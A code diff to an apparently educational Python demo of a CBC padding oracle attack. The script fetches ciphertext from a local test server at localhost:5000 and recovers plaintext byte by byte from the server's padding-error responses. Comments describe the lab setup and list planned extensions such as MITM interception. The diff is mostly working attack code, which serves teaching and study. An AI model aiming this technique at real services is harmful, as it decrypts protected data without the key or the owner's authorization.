@@ -7,13 +7,17 @@ BLOCK_SIZE = 16
 URL = "http://localhost:5000/decrypt"
 
 # ▶️ Step 1: Prepare ciphertext to simulate a real scenario
-plaintext = b"Secret message here!"
-KEY = os.urandom(BLOCK_SIZE)
-IV = os.urandom(BLOCK_SIZE)
+# plaintext = b"Secret message here!"
+# KEY = os.urandom(BLOCK_SIZE)
+# IV = os.urandom(BLOCK_SIZE)
 
-# (Encrypt plaintext as server does)
-cipher = AES.new(KEY, AES.MODE_CBC, IV)
-ciphertext = IV + cipher.encrypt(pad(plaintext, BLOCK_SIZE))
+# # (Encrypt plaintext as server does)
+# cipher = AES.new(KEY, AES.MODE_CBC, IV)
+# ciphertext = IV + cipher.encrypt(pad(plaintext, BLOCK_SIZE))
+
+# Get ciphertext from server (pre-encrypted from server-side). NOTE: Exactly as the attacker intercepted on the network. Instead of sniffing from the traffic, we "pretend" to get it from /ciphertext.
+ciphertext = bytes.fromhex(requests.get("http://localhost:5000/ciphertext").json()["ciphertext"])
+print("Ciphertext received from server:", ciphertext.hex())
 
 # ▶️ Step 2: Split into 16-byte blocks
 blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
@@ -22,8 +26,9 @@ def padding_oracle(modified_ciphertext: bytes) -> bool:
     """
     Sends a modified ciphertext to the server and returns True if the padding is valid.
     """
-    hex_data = modified_ciphertext.hex()
-    response = requests.post(URL, json={"data": hex_data})
+    # hex_data = modified_ciphertext.hex()
+    # response = requests.post(URL, json={"data": hex_data})
+    response = requests.post(URL, json={"data": modified_ciphertext.hex()})
     return response.status_code != 403  # If 403, it's a padding error
 
 def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
@@ -34,9 +39,9 @@ def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
     recovered = bytearray(BLOCK_SIZE)
     intermediate = bytearray(BLOCK_SIZE)
 
-    # Only attack the last 2 bytes to reduce brute-force time
-    # for i in reversed(range(BLOCK_SIZE)):
-    for i in reversed(range(BLOCK_SIZE - 8, BLOCK_SIZE)): # Only last 8 bytes to save time
+    # Only attack the last 8 bytes to reduce brute-force time
+    for i in reversed(range(BLOCK_SIZE)):
+    # for i in reversed(range(BLOCK_SIZE - 8, BLOCK_SIZE)): # Only last 8 bytes to save time
         print(f"Attacking byte {i + 1} of the last block --------")
         pad_byte = BLOCK_SIZE - i
         prefix = bytearray(os.urandom(i))
@@ -64,12 +69,12 @@ def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
 
     return recovered
 
-recovered_plain = attack_block(blocks[-2], blocks[-1])
-# print("Recovered plaintext (partial):", recovered_plain[-2:].decode(errors='ignore'))
-print("Recovered plaintext (full, maybe padded):", recovered_plain.decode(errors='ignore'))
-print("Hex:", recovered_plain.hex())
+# recovered_plain = attack_block(blocks[-2], blocks[-1])
+recovered_plain = attack_block(blocks[0], blocks[1])
+print("Recovered plaintext:", recovered_plain.decode())
 
 """
+Simulate how an attacker can decrypt plaintext from ciphertext without knowing the key, based only on error responses from the server.
 oracle_server.py simulates a server receiving ciphertext and responding according to padding
 attacker.py simulates an attacker who doesn't know the key but gradually guesses the plaintext
 When the run is complete, you'll see the original plaintext printed from the ciphertext without the key
@@ -104,4 +109,9 @@ AES block size = 16 byte ⇒:
 | --------------------- | --------------------------------------------------- |
 | b'Secret message h'   | b'ere!\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b' |
 👉 "ere!" is at the beginning of block 2 — that is, block 2 contains the word "ere!" and the padding.
+
+TODO: to upgrade the demo to:
+- attacker intercepts ciphertext from MITM
+- attack multiple blocks
+- generate fake code like in CTFs
 """
